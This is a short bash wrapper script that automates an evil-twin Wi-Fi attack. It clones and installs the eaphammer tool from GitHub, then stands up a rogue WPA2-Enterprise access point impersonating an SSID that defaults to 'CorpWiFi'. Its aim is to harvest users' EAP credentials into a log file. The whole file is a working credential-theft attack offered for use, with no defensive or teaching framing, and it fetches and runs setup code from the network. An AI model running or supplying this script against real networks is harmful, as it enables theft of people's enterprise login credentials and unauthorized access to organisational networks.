#!/bin/bash
# Automated EAP credential harvest
# Usage: ./eaphammer-auto.sh <ssid> <channel> <interface>
SSID="${1:-CorpWiFi}"
CHAN="${2:-6}"
IFACE="${3:-wlan0}"

if [ ! -d eaphammer ]; then
    git clone https://github.com/s0lst1c3/eaphammer
    cd eaphammer && ./kali-setup && cd ..
fi

cd eaphammer
./eaphammer -i "$IFACE" --channel "$CHAN" --auth wpa2-eap --creds --mana \
    -e "$SSID" --cert-wizard --auto

echo "[+] Credentials saved to: logs/creds.log"
